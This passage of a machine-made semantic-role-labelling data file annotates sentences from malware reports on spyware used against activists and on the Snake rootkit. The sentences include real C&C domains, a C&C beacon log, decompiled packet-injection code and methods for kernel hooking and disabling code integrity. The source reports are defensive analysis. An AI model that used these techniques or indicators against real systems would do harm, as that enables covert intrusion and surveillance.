executable"}, "V": {"text": "contained", "index": 2}, "ARG1": {"text": "a similar string , except it identi- fied itself as FinSpy v3.00 , and attempted to connect to tiger.gamma-international.de , a domain registered to Gamma International GmbH"}}, "identi-": {"ARG0": {"text": "it"}, "V": {"text": "identi-", "index": 9}, "ARG1": {"text": "fied itself"}}, "fied": {"ARG0": {"text": "it identi-"}, "V": {"text": "fied", "index": 10}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as FinSpy v3.00"}}, "attempted": {"V": {"text": "attempted", "index": 17}, "ARG1": {"text": "to connect to tiger.gamma-international.de , a domain registered to Gamma International GmbH"}}, "connect": {"V": {"text": "connect", "index": 19}, "ARG1": {"text": "to tiger.gamma-international.de , a domain registered to Gamma International GmbH"}}, "registered": {"ARG1": {"text": "a domain"}, "V": {"text": "registered", "index": 25}, "ARG2": {"text": "to Gamma International GmbH"}}}, " While corresponding\nwith Ahmed on his compromised account, an author of this pa-\nper discovered that the attackers had installed an application-\nspecific password <fn>[56]</fn>  in Ahmed\u2019s GMail account, a secondary\n\npassword that they apparently used to access his account even\nafter he changed his main password": {"corresponding": {"V": {"text": "corresponding", "index": 1}, "ARG2": {"text": "with Ahmed"}, "ARGM-LOC": {"text": "on his compromised account"}}, "compromised": {"ARG0": {"text": "his"}, "V": {"text": "compromised", "index": 6}, "ARG1": {"text": "account"}}, "discovered": {"ARGM-ADV": {"text": "While corresponding with Ahmed on his compromised account"}, "ARG0": {"text": "an author of this pa- per"}, "V": {"text": "discovered", "index": 15}, "ARG1": {"text": "that the attackers had installed an application- specific password in Ahmed \u2019s GMail account , a secondary password that they apparently used to access his account even after he changed his main password"}}, "had": {"V": {"text": "had", "index": 19}}, "installed": {"ARG0": {"text": "the attackers"}, "V": {"text": "installed", "index": 20}, "ARG1": {"text": "an application- specific password in Ahmed \u2019s GMail account , a secondary password that they apparently used to access his account even after he changed his main password"}}, "used": {"ARG1": {"text": "a secondary password"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "they"}, "ARGM-ADV": {"text": "apparently"}, "V": {"text": "used", "index": 37}, "ARG2": {"text": "to access his account"}, "ARGM-TMP": {"text": "even after he changed his main password"}}, "access": {"ARG0": {"text": "they"}, "V": {"text": "access", "index": 39}, "ARG1": {"text": "his account"}}, "changed": {"ARG0": {"text": "he"}, "V": {"text": "changed", "index": 45}, "ARG1": {"text": "his main password"}}}, " In some cases the attackers employed\nexpensive and \u201cgovernment exclusive\u201d malware, while in other\ncases, attackers used cheap and readily available RATs": {"employed": {"ARGM-LOC": {"text": "In some cases"}, "ARG0": {"text": "the attackers"}, "V": {"text": "employed", "index": 5}, "ARG1": {"text": "expensive"}, "ARGM-ADV": {"text": "while in other cases , attackers used cheap and readily available RATs"}}, "used": {"ARGM-LOC": {"text": "in other cases"}, "ARG1": {"text": "attackers"}, "V": {"text": "used", "index": 20}, "ARG2": {"text": "cheap"}}}, " These individuals received e-mails containing a\nlink to a web page hosted on cedarkeyrv.com impersonat-\ning YouTube": {"received": {"ARG0": {"text": "These individuals"}, "V": {"text": "received", "index": 2}, "ARG1": {"text": "e - mails containing a link to a web page hosted on cedarkeyrv.com impersonat- ing YouTube"}}, "containing": {"ARG0": {"text": "e - mails"}, "V": {"text": "containing", "index": 6}, "ARG1": {"text": "a link to a web page hosted on cedarkeyrv.com impersonat- ing YouTube"}}, "hosted": {"ARG0": {"text": "web page"}, "V": {"text": "hosted", "index": 13}, "ARGM-LOC": {"text": "on cedarkeyrv.com"}}, "ing": {"V": {"text": "ing", "index": 17}}}, " We located additional samples (see\n \u00a7 5), some of which were embedded in a .jar file that installs\n an OS-appropriate version of RCS (Windows or OSX), option-\n ally using an exploit": {"located": {"ARG0": {"text": "We"}, "V": {"text": "located", "index": 1}, "ARG1": {"text": "additional samples ("}, "ARGM-LOC": {"text": "see/ \u00a7 5 )"}, "C-ARG1": {"text": "some of which were embedded in a .jar file that installs an OS - appropriate version of RCS ( Windows or OSX ) , option- ally using an exploit"}}, "see": {"V": {"text": "see", "index": 5}, "ARG1": {"text": "\u00a7 5 )"}}, "were": {"V": {"text": "were", "index": 13}}, "embedded": {"ARG1": {"text": "some of which"}, "V": {"text": "embedded", "index": 14}, "ARG2": {"text": "in a .jar file that installs an OS - appropriate version of RCS ( Windows or OSX ) , option- ally using an exploit"}}, "installs": {"ARG0": {"text": "a .jar file"}, "R-ARG0": {"text": "that"}, "V": {"text": "installs", "index": 20}, "ARG1": {"text": "an OS - appropriate version of RCS ( Windows or OSX )"}, "ARGM-PRD": {"text": "using an exploit"}}, "using": {"V": {"text": "using", "index": 36}, "ARG1": {"text": "an exploit"}}}, "\n    The first attacks in Figure 3 date to 2012, and use bait files\nwith a DarkComet RAT payload": {"use": {"V": {"text": "use", "index": 11}, "ARG1": {"text": "bait files"}, "ARG2": {"text": "with a DarkComet RAT payload"}}}, "\n</section><section>\n<heading>IP spy Campaign.</heading> In an IP spy attack, the attacker aims to\ndiscover the IP address of a victim who is typically the opera-\ntor of a pseudonymous social media or e-mail account": {"aims": {"ARGM-LOC": {"text": "In an IP spy attack"}, "ARG0": {"text": "the attacker"}, "V": {"text": "aims", "index": 8}, "ARG1": {"text": "to discover the IP address of a victim who is typically the opera- tor of a pseudonymous social media or e - mail"}}, "discover": {"ARG0": {"text": "the attacker"}, "V": {"text": "discover", "index": 10}, "ARG1": {"text": "the IP address of a victim who is typically the opera- tor of a pseudonymous social media or e - mail account"}}, "is": {"ARG1": {"text": "a victim"}, "R-ARG1": {"text": "who"}, "V": {"text": "is", "index": 18}, "ARGM-ADV": {"text": "typically"}, "ARG2": {"text": "the opera- tor of a pseudonymous social media or e - mail account"}}}, " Member C and NGO Worker\nD (here, actual victims, not abstract), targeting was by e-mail\nfrom domains apparently belonging to opposition groups, in-\ndicating a potential compromise": {"targeting": {"V": {"text": "targeting", "index": 16}}, "was": {"V": {"text": "was", "index": 17}, "ARG0": {"text": "by e - mail from domains apparently belonging to opposition groups"}}, "belonging": {"ARG0": {"text": "e - mail from domains"}, "ARGM-ADV": {"text": "apparently"}, "V": {"text": "belonging", "index": 25}, "ARG1": {"text": "to opposition groups"}}, "dicating": {"ARG0": {"text": "Member C and NGO Worker D ( here , actual victims , not abstract ) ,"}, "V": {"text": "dicating", "index": 31}, "ARG1": {"text": "a potential compromise"}}}, "        We found that some\n    of the attachments contained a PE (.exe) file designed to\n    appear as an image": {"found": {"ARG0": {"text": "We"}, "V": {"text": "found", "index": 1}, "ARG1": {"text": "that some of the attachments contained a PE ( .exe ) file designed to appear as an image"}}, "contained": {"ARG0": {"text": "some of the attachments"}, "V": {"text": "contained", "index": 7}, "ARG1": {"text": "a PE ( .exe ) file designed to appear as an image"}}, "designed": {"ARG1": {"text": "a PE ( .exe ) file"}, "V": {"text": "designed", "index": 14}, "ARG3": {"text": "to appear as an image"}}, "appear": {"V": {"text": "appear", "index": 16}, "ARGM-PRD": {"text": "as an image"}}}, " Across\nthese cases we find that clever social engineering often plays\na central role, which is strong evidence of a well-informed ad-\nversary": {"find": {"ARGM-LOC": {"text": "Across these cases"}, "ARG0": {"text": "we"}, "V": {"text": "find", "index": 4}, "ARG1": {"text": "that clever social engineering often plays a central role , which is strong evidence of a well - informed ad- versary"}}, "plays": {"ARG0": {"text": "clever social engineering"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "plays", "index": 10}, "ARG1": {"text": "a central role"}, "ARGM-ADV": {"text": "which is strong evidence of a well - informed ad- versary"}}, "is": {"ARG1": {"text": "a central role"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 16}, "ARG2": {"text": "strong evidence of a well - informed ad- versary"}}, "informed": {"ARGM-EXT": {"text": "well"}, "V": {"text": "informed", "index": 23}}}, " One difference was in the vectors\n used to install the spyware": {"was": {"ARG1": {"text": "One difference"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "in the vectors used to install the spyware"}}, "used": {"ARG1": {"text": "the vectors"}, "V": {"text": "used", "index": 6}, "ARG2": {"text": "to install the spyware"}}, "install": {"V": {"text": "install", "index": 8}, "ARG1": {"text": "the spyware"}}}, " Typically, targets receive\neither (1) a PE in a .zip or .rar, (2) a file download link, or\n(3) a link that will trigger a drive-by download": {"receive": {"ARGM-ADV": {"text": "Typically"}, "ARG0": {"text": "targets"}, "V": {"text": "receive", "index": 3}, "ARG1": {"text": "either ( 1 ) a PE in a .zip or .rar"}}, "will": {"V": {"text": "will", "index": 31}, "ARG1": {"text": "trigger a drive"}}, "trigger": {"ARG0": {"text": "a link"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "trigger", "index": 32}, "ARG1": {"text": "a drive"}, "ARGM-MNR": {"text": "by download"}}, "drive": {"V": {"text": "drive", "index": 34}}}, " This domain was also\nused for C&C in other attacks, including that on Journalist C": {"was": {"ARG1": {"text": "This domain"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "used for C&C in other attacks , including that on Journalist C"}}, "used": {"ARG1": {"text": "This domain"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "used", "index": 4}, "ARG2": {"text": "for C&C in other attacks"}}, "including": {"ARG2": {"text": "C&C/ other attacks"}, "V": {"text": "including", "index": 11}, "ARG1": {"text": "that on Journalist C"}}}, "\n\nThe analysed code suggests that even file system and registry operations can be delegated by an infected module to another\nmodule in order to stay unnoticed by behaviour analysis engines of the antivirus products, and to overcome account restrictions of\nthe browser processes so that the injected module could still write into files and into the sensitive registry hives": {"suggests": {"ARG0": {"text": "The analysed code"}, "V": {"text": "suggests", "index": 3}, "ARG1": {"text": "that even file system and registry operations can be delegated by an infected module to another module in order to stay unnoticed by behaviour analysis engines of the antivirus products , and to overcome account restrictions of the browser processes so that the injected module could still write into files and into the sensitive registry hives"}}, "file": {"V": {"text": "file", "index": 6}, "ARG1": {"text": "system"}}, "can": {"V": {"text": "can", "index": 11}}, "be": {"V": {"text": "be", "index": 12}}, "delegated": {"ARG1": {"text": "even file system and registry operations"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "delegated", "index": 13}, "ARG0": {"text": "by an infected module to another module"}, "ARGM-PRP": {"text": "in order to stay unnoticed by behaviour analysis engines of the antivirus products , and to overcome account restrictions of the browser processes so that the injected module could still write into files and into the sensitive registry hives"}}, "stay": {"V": {"text": "stay", "index": 24}, "ARG3": {"text": "unnoticed by behaviour analysis engines of the antivirus products"}}, "overcome": {"V": {"text": "overcome", "index": 37}, "ARG1": {"text": "account restrictions of the browser processes"}, "ARGM-PRP": {"text": "so that the injected module could still write into files and into the sensitive registry hives"}}, "could": {"V": {"text": "could", "index": 49}}, "write": {"ARG0": {"text": "the injected module"}, "ARGM-MOD": {"text": "could"}, "ARGM-TMP": {"text": "still"}, "V": {"text": "write", "index": 51}, "ARGM-DIR": {"text": "into files and into the sensitive registry hives"}}}, "\n\nAnalysis of the commands performed by the malware suggests the following capabilities:\n<list>\n    \u2022\t   Scan the network for the presence of other hosts (maximum 1 hour is allocated for this task)\n    \u2022\t   Set maximum upload file size\n    \u2022\t   Go \u2018stealth\u2019 mode for the specified number of days - Snake will not initiate any connections during that time\n    \u2022\t   Run specified shell commands and collect the output logs for further delivery\n    \u2022\t   Modify settings stored with the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n    \u2022\t   Search for files\n    \u2022\t   Upload specified files\n    \u2022\t   Add new C&C domains\n    \u2022\t   Update the driver with a new version\n    \u2022\t   Download files\n    \u2022\t   Run specified executable files\n    \u2022\t   Set self-deactivation timeout\n    \u2022\t   If the virtual partition \\\\.\\vd1 exists, copy all Snake logs into that partition\n</list>\nTogether, these commands provide complete backdoor functionality, allowing remote attacker full control over the compromised\nsystem": {"performed": {"ARG1": {"text": "Analysis of the commands"}, "V": {"text": "performed", "index": 4}, "ARG0": {"text": "by the malware"}}, "suggests": {"ARG0": {"text": "Analysis of the commands performed by the malware"}, "V": {"text": "suggests", "index": 8}, "ARG1": {"text": "the following capabilities"}}, "following": {"V": {"text": "following", "index": 10}, "ARG1": {"text": "capabilities"}}, "provide": {"ARGM-MNR": {"text": "Together"}, "ARG0": {"text": "these commands"}, "V": {"text": "provide", "index": 17}, "ARG1": {"text": "complete backdoor functionality"}, "ARGM-ADV": {"text": "allowing remote attacker full control over the compromised system"}}, "allowing": {"ARG0": {"text": "these commands"}, "V": {"text": "allowing", "index": 22}, "ARG1": {"text": "remote attacker full control over the compromised system"}}, "compromised": {"V": {"text": "compromised", "index": 29}, "ARG1": {"text": "system"}}}, "\n\nThe driver inspects bidirectional network data on a per stream basis, as it\u2019s located right on the stream data path": {"inspects": {"ARG0": {"text": "The driver"}, "V": {"text": "inspects", "index": 2}, "ARG1": {"text": "bidirectional network data"}, "ARGM-MNR": {"text": "on a per stream basis"}, "ARGM-TMP": {"text": "as it \u2019s located right on the stream data path"}}, "located": {"ARG1": {"text": "it"}, "V": {"text": "located", "index": 15}, "ARGM-LOC": {"text": "right on the stream data path"}}}, " a browser), it will inject malicious DLL module\n         into it; depending on the operational mode, the DLL may start communicating with C&C directly": {"will": {"ARG0": {"text": "it"}, "V": {"text": "will", "index": 5}, "ARG1": {"text": "inject malicious DLL module into it"}}, "inject": {"ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "inject", "index": 6}, "ARG1": {"text": "malicious DLL module into it"}}, "depending": {"V": {"text": "depending", "index": 13}, "ARG1": {"text": "on the operational mode"}}, "may": {"V": {"text": "may", "index": 21}}, "start": {"ARGM-ADV": {"text": "depending on the operational mode"}, "ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "start", "index": 22}, "ARG1": {"text": "communicating"}, "ARGM-MNR": {"text": "with C&C/ directly"}}, "communicating": {"ARG0": {"text": "the DLL"}, "V": {"text": "communicating", "index": 23}, "ARG3": {"text": "with C&C"}, "ARGM-MNR": {"text": "directly"}}}, " In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit\ndriver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP": {"ensure": {"V": {"text": "ensure", "index": 7}, "ARG1": {"text": "the driver is loaded automatically at startup"}}, "is": {"V": {"text": "is", "index": 10}}, "loaded": {"ARG1": {"text": "the driver"}, "V": {"text": "loaded", "index": 11}, "ARGM-MNR": {"text": "automatically"}, "ARGM-LOC": {"text": "at startup"}}, "can": {"V": {"text": "can", "index": 18}}, "install": {"ARGM-LOC": {"text": "In this case"}, "ARGM-PRP": {"text": "in order to ensure the driver is loaded automatically at startup"}, "ARG0": {"text": "the dropper"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "install", "index": 19}, "ARG1": {"text": "the 64-bit driver"}, "ARG2": {"text": "on 64-bit Windows XP"}, "ARGM-MNR": {"text": "in the same way it installs a 32-bit driver on a 32-bit version of Windows XP"}}, "installs": {"ARGM-MNR": {"text": "the same way"}, "ARG0": {"text": "it"}, "V": {"text": "installs", "index": 32}, "ARG1": {"text": "a 32-bit driver"}, "ARG2": {"text": "on a 32-bit version of Windows XP"}}}, "\n\nIn order to log its activity, the driver writes log data into the pipe \\Device\\NamedPipe\\isapi_log, so that the DLL could log the\ndata into the log files": {"log": {"V": {"text": "log", "index": 3}, "ARG1": {"text": "its activity"}}, "writes": {"ARGM-PRP": {"text": "In order to log its activity/ so that the DLL could log the data into the log files"}, "ARG0": {"text": "the driver"}, "V": {"text": "writes", "index": 9}, "ARG1": {"text": "log data into the pipe \\Device\\NamedPipe\\isapi_log ,"}}, "log_2": {"ARGM-PRP": {"text": "In order to log its activity/ so that the DLL could log the data into the log files"}, "ARG0": {"text": "the driver writes"}, "V": {"text": "log", "index": 10}, "ARG1": {"text": "data into the pipe \\Device\\NamedPipe\\isapi_log"}}, "could": {"V": {"text": "could", "index": 21}}, "log_3": {"ARG0": {"text": "the DLL"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "log", "index": 22}, "ARG1": {"text": "the data into the log files"}}}, "\n\n Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it": {"reveals": {"ARG0": {"text": "Static analysis of the code"}, "V": {"text": "reveals", "index": 5}, "ARG1": {"text": "that the Snake driver uses virtual volumes to store its data and additional files on it"}}, "uses": {"ARG0": {"text": "the Snake driver"}, "V": {"text": "uses", "index": 10}, "ARG1": {"text": "virtual volumes"}, "ARG2": {"text": "to store its data and additional files on it"}}, "store": {"ARG0": {"text": "the Snake driver"}, "V": {"text": "store", "index": 14}, "ARG1": {"text": "its data and additional files"}, "ARGM-LOC": {"text": "on it"}}}, " An ability to\nmanipulate data streams is provided with the packet injection logic below, allowing Snake to covertly insert traffic destined to its\nC&C servers:\n<code>\n      01    int __stdcall stream_inject(int flowHandle, int calloutId, int layerId)\n      02    {\n      03        int iRet = 0;\n      04        int ntStatus = FwpsAllocateNetBufferAndNetBufferList(m_hNdisNblPool, 0, 0, 0, 0, &iRet);\n      05        if (!ntStatus)\n      06        {\n      07            ntStatus = _FwpsStreamInjectAsync(m_hInjection,\n      08                                               0,\n      09                                               0,\n      10                                               flowHandle,\n      11                                               calloutId,\n      12                                               layerId,\n      13                                               20,\n      14                                               3,\n      15                                               iRet,\n      16                                               0,\n      17                                               sStreamInjectCompletion,\n      18                                               0);\n      19        if (!ntStatus)\n      20        {\n      21            iRet = 0;\n      22        }\n      23        if (iRet)\n      24        {\n      25           FwpsFreeNetBufferList(iRet);\n      26        }\n      27        return ntStatus;\n      28    }\n</code>\n\n<footer>                                                        BAE Systems Applied Intelligence: Snake Rootkit Report 2014           15</footer>\n\fIn order to qualify as a browser, the usermode process must have any of the following names:\n<code>\n        01    bool isBrowserProcess(const wchar_t *szProcName)\n        02    {\n        03        return !wcsicmp(szProcName, L\u201diexplore.exe\u201d) ||\n        04               !wcsicmp(szProcName, L\u201dfirefox.exe\u201d) ||\n        05               !wcsicmp(szProcName, L\u201dopera.exe\u201d) ||\n        06               !wcsicmp(szProcName, L\u201dnetscape.exe\u201d) ||\n        07               !wcsicmp(szProcName, L\u201dmozilla.exe\u201d) ||\n        08               !wcsicmp(szProcName, L\u201dchrome.exe\u201d);\n        09    }\n</code>\n</section>\n<section>\n<heading>\n\n\n\nTDI FILTER DRIVER</heading>\nIn addition to WFP, Snake also hooks the Transport Driver Interface (TDI) network routines by setting itself up as a TDI filter driver": {"manipulate": {"V": {"text": "manipulate", "index": 3}, "ARG1": {"text": "data streams"}}, "is": {"V": {"text": "is", "index": 6}}, "provided": {"ARG1": {"text": "An ability to manipulate data streams"}, "V": {"text": "provided", "index": 7}, "ARGM-MNR": {"text": "with the packet injection logic"}, "ARGM-LOC": {"text": "below"}, "ARGM-ADV": {"text": "allowing Snake to covertly insert traffic destined to its C&C servers"}}, "allowing": {"V": {"text": "allowing", "index": 15}, "ARG1": {"text": "Snake to covertly insert traffic destined to its C&C servers"}}, "insert": {"ARG0": {"text": "Snake"}, "ARGM-MNR": {"text": "covertly"}, "V": {"text": "insert", "index": 19}, "ARG1": {"text": "traffic destined"}, "ARG2": {"text": "to its C&C servers"}}, "destined": {"ARG1": {"text": "Snake to covertly insert traffic"}, "V": {"text": "destined", "index": 21}, "ARG2": {"text": "to its C&C servers"}}, "hooks": {"ARGM-ADV": {"text": "In addition to WFP/ also"}, "ARG0": {"text": "Snake"}, "V": {"text": "hooks", "index": 34}, "ARG1": {"text": "the Transport Driver Interface ( TDI ) network routines"}, "ARGM-MNR": {"text": "by setting itself up as a TDI filter driver"}}, "setting": {"V": {"text": "setting", "index": 45}, "ARG1": {"text": "itself"}, "ARGM-PRD": {"text": "as a TDI filter driver"}}}, "\nNext, it fetches a file /D/pub.txt, and expects the server to respond with a string \u201c1\u201d, acknowledging it\u2019s active:\n<list>\n      03:52:06 1336: Connect swim.onlinewebshop.net                    type(0)..": {"fetches": {"ARGM-TMP": {"text": "Next"}, "ARG0": {"text": "it"}, "V": {"text": "fetches", "index": 3}, "ARG1": {"text": "a file /D / pub.txt"}}, "expects": {"ARGM-TMP": {"text": "Next"}, "ARG0": {"text": "it"}, "V": {"text": "expects", "index": 11}, "ARG1": {"text": "the server to respond with a string \u201c 1 \u201d"}, "ARGM-ADV": {"text": "acknowledging it \u2019s active"}, "ARGM-PRD": {"text": ": 03:52:06 1336 : Connect swim.onlinewebshop.net type(0 )"}}, "respond": {"ARG0": {"text": "the server"}, "V": {"text": "respond", "index": 15}, "ARG1": {"text": "with a"}, "ARGM-MNR": {"text": "string \u201c 1 \u201d"}}, "acknowledging": {"ARG0": {"text": "it"}, "V": {"text": "acknowledging", "index": 23}, "ARG1": {"text": "it \u2019s active : 03:52:06 1336 : Connect swim.onlinewebshop.net type(0 )"}}, "Connect": {"V": {"text": "Connect", "index": 31}, "ARG1": {"text": "swim.onlinewebshop.net type(0 )"}}}, " If such a driver is installed via an update, the usermode component can be instructed to delegate the file upload\ntask to the driver by copying all the necessary logs into the shared virtual partition, physically located on the compromised host and\nthus, accessible from kernel": {"is": {"ARG1": {"text": "such a driver"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "installed via an update"}}, "installed": {"ARG1": {"text": "such a driver"}, "V": {"text": "installed", "index": 5}, "ARGM-MNR": {"text": "via an update"}}, "can": {"V": {"text": "can", "index": 13}}, "be": {"V": {"text": "be", "index": 14}}, "instructed": {"ARGM-ADV": {"text": "If such a driver is installed via an update"}, "ARG1": {"text": "the usermode component"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "instructed", "index": 15}, "ARG2": {"text": "to delegate the file upload task to the driver by copying all the necessary logs into the shared virtual partition , physically located on the compromised host and thus , accessible from kernel"}}, "delegate": {"ARG0": {"text": "the usermode component"}, "V": {"text": "delegate", "index": 17}, "ARG1": {"text": "the file upload task to the driver"}, "ARGM-MNR": {"text": "by copying all the necessary logs into the shared virtual partition , physically located on the compromised host and thus , accessible from kernel"}}, "copying": {"ARG0": {"text": "the usermode component"}, "V": {"text": "copying", "index": 26}, "ARG1": {"text": "all the necessary logs into the shared virtual partition"}, "ARGM-MNR": {"text": "physically"}}, "shared": {"V": {"text": "shared", "index": 33}, "ARG1": {"text": "virtual/ partition"}}, "located": {"ARGM-MNR": {"text": "physically"}, "V": {"text": "located", "index": 38}, "ARGM-LOC": {"text": "on the compromised host"}}, "compromised": {"V": {"text": "compromised", "index": 41}, "ARG1": {"text": "host"}}}, " They use highly sophisticated\nmalware tools to maintain persistent access to their targets": {"use": {"ARG0": {"text": "They"}, "V": {"text": "use", "index": 1}, "ARG1": {"text": "highly sophisticated malware tools"}, "ARG2": {"text": "to maintain persistent access to their targets"}}, "maintain": {"ARG0": {"text": "They"}, "V": {"text": "maintain", "index": 7}, "ARG1": {"text": "persistent access to their targets"}}}, "\n\n<footer>                                                            BAE Systems Applied Intelligence: Snake Rootkit Report 2014           16</footer>\n\fAfter that, the drivers hooks the following exports within ndis.sys (for NDIS 6.0):\n<list>\n    \u2022\t NdisFRegisterFilterDriver\n    \u2022\t NdisFDeregisterFilterDriver\n    \u2022\t NdisSetOptionalHandlers\n    \u2022\t NdisFSetAttributes\n</list>\nAnother set of exports it attempts to hook in ndis.sys (for NDIS 6.0) is:\n<list>\n    \u2022\t NdisMRegisterMiniportDriver\n    \u2022\t NdisMDeregisterMiniportDriver\n    \u2022\t NdisMIndicateReceiveNetBufferLists\n    \u2022\t NdisMRestartComplete\n    \u2022\t NdisMPauseComplete\n</list>\nWith the hooks installed, whenever the network adapter driver attempts to register to NDIS, or whenever there is an attempt to\ninstall NDIS intermediate driver or NDIS filter driver, the hook handlers will register Snake\u2019s own MiniportXxx functions with the NDIS\nlibrary": {"installed": {"ARG1": {"text": "the hooks"}, "V": {"text": "installed", "index": 3}}, "attempts": {"ARGM-TMP": {"text": "whenever"}, "ARG0": {"text": "the network adapter driver"}, "V": {"text": "attempts", "index": 10}, "ARG1": {"text": "to register to NDIS"}}, "register": {"ARG0": {"text": "the network adapter driver"}, "V": {"text": "register", "index": 12}, "ARG2": {"text": "to NDIS"}}, "is": {"ARGM-TMP": {"text": "whenever"}, "V": {"text": "is", "index": 19}, "ARG1": {"text": "an attempt to install NDIS intermediate driver or NDIS filter driver"}}, "install": {"V": {"text": "install", "index": 23}, "ARG1": {"text": "NDIS intermediate driver or NDIS filter driver"}}, "will": {"ARGM-ADV": {"text": "With the hooks installed"}, "ARGM-TMP": {"text": "whenever the network adapter driver attempts to register to NDIS , or whenever there is an attempt to install NDIS intermediate driver or NDIS filter driver"}, "ARG0": {"text": "the hook handlers"}, "V": {"text": "will", "index": 35}, "ARG1": {"text": "register Snake \u2019s own MiniportXxx functions with the NDIS library"}}, "register_2": {"ARGM-ADV": {"text": "With the hooks installed"}, "ARGM-TMP": {"text": "whenever the network adapter driver attempts to register to NDIS , or whenever there is an attempt to install NDIS intermediate driver or NDIS filter driver"}, "ARG0": {"text": "the hook handlers"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "register", "index": 36}, "ARG1": {"text": "Snake \u2019s own MiniportXxx functions"}, "ARG2": {"text": "with the NDIS library"}}}, "\n\nAfter that, the drivers hooks the following exports within ndis.sys:\n<list>\n    \u2022\t NdisIMRegisterLayeredMiniport\n    \u2022\t NdisTerminateWrapper\n</list>\nThe rootkit contains code that installs NDIS filter driver for NDIS 6.0 and above:\n<list>\n    Unique name: {c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\n    User-readable description: filter_c06b1a3b\n</list>\nNDIS filter driver configuration is stored in the registry entry:\n<list>\n    HKLM\\SYSTEM\\CurrentControlSet\\Control\\Network\\{4d36e974-e325-11ce-bfc1-08002be10318}\n</list>\nThe driver is registered with NdisFRegisterFilterDriver() API": {"hooks": {"ARGM-TMP": {"text": "After that"}, "ARG0": {"text": "the drivers"}, "V": {"text": "hooks", "index": 5}, "ARG1": {"text": "the following"}, "ARG2": {"text": "exports within ndis.sys"}}, "following": {"V": {"text": "following", "index": 7}, "ARG1": {"text": "exports"}}, "is": {"ARG1": {"text": "The driver"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "registered"}}, "registered": {"ARG1": {"text": "The driver"}, "V": {"text": "registered", "index": 15}, "ARG2": {"text": "with NdisFRegisterFilterDriver"}, "ARGM-MNR": {"text": "( ) API"}}}, " OK\n      03:52:11 1404: GET /D/77568289\n      03:52:12 1404: Http status: 200\n      03:52:12 1404: Command for all\n      03:52:12 1404: recv 346/346\n      03:52:12 Command Id:303149772662877808(130201837456870000)[13:42:25 05/08/2013]\n</list>\n\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014        9</footer>\n\n\n\fThe command it receives from C&C above (swim.onlinewebshop.net) is encrypted": {"GET": {"V": {"text": "GET", "index": 4}}, "Command": {"V": {"text": "Command", "index": 16}, "ARGM-TMP": {"text": "for all 03:52:12 1404"}}, "receives": {"ARG1": {"text": "The command"}, "ARG0": {"text": "it"}, "V": {"text": "receives", "index": 32}, "ARG2": {"text": "from C&C"}}, "is": {"V": {"text": "is", "index": 39}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "C&C above ( swim.onlinewebshop.net )"}, "V": {"text": "encrypted", "index": 40}}}, "\n\nInfection starts from a dropper penetrating into the compromised system where it is allowed to run": {"starts": {"ARG1": {"text": "Infection"}, "V": {"text": "starts", "index": 1}, "ARG2": {"text": "from a dropper penetrating"}, "C-ARG1": {"text": "into the compromised system where it is allowed to run"}}, "compromised": {"V": {"text": "compromised", "index": 8}, "ARG1": {"text": "system"}}, "is": {"V": {"text": "is", "index": 12}}, "allowed": {"V": {"text": "allowed", "index": 13}, "ARG1": {"text": "to run"}}, "run": {"ARGM-LOC": {"text": "the compromised system"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "it"}, "V": {"text": "run", "index": 15}}}, "\n\n\nBeing registered as a TDI driver on the device stack, Snake hooks TCP calls": {"Being": {"V": {"text": "Being", "index": 0}}, "registered": {"V": {"text": "registered", "index": 1}, "ARG2": {"text": "as a TDI driver on the device stack"}, "ARG1": {"text": "Snake hooks TCP calls"}}, "hooks": {"ARG2": {"text": "Snake"}, "V": {"text": "hooks", "index": 12}}}, "\n    36             }\n    37         }\n    38     }\n</code>\n\nNow that the vulnerable driver can be used as a weapon to patch kernel memory, all the malware needs to do is to patch the content\nof the variable nt!g_CiEnabled, a boolean variable \u201cCode Integrity Enabled\u201d that marks whether the system was booted in\nWinPE mode": {"can": {"V": {"text": "can", "index": 11}}, "be": {"V": {"text": "be", "index": 12}}, "used": {"ARG1": {"text": "the vulnerable driver"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 13}, "ARG2": {"text": "as a weapon to patch kernel memory"}}, "patch": {"V": {"text": "patch", "index": 18}, "ARG1": {"text": "kernel memory"}}, "needs": {"ARG0": {"text": "all the malware"}, "V": {"text": "needs", "index": 25}, "ARG1": {"text": "to do"}}, "do": {"ARG1": {"text": "all"}, "V": {"text": "do", "index": 27}}, "is": {"ARGM-ADV": {"text": "36 } 37 } 38 } Now that"}, "ARGM-PRD": {"text": "the vulnerable driver can be used as a weapon to patch kernel memory"}, "ARG1": {"text": "all the malware needs to do"}, "V": {"text": "is", "index": 28}, "ARG2": {"text": "to patch the content of the variable nt!g_CiEnabled , a boolean variable \u201c Code Integrity Enabled \u201d that marks whether the system was booted in WinPE mode"}}, "patch_2": {"V": {"text": "patch", "index": 30}, "ARG1": {"text": "the content of the variable nt!g_CiEnabled"}}, "nt!g_CiEnabled": {"ARG1": {"text": "the variable"}, "V": {"text": "nt!g_CiEnabled", "index": 36}}, "Enabled": {"ARG0": {"text": "a boolean variable \u201c Code Integrity"}, "V": {"text": "Enabled", "index": 44}, "ARG2": {"text": "\u201d that marks"}, "ARG1": {"text": "whether the system was booted in WinPE mode"}}, "marks": 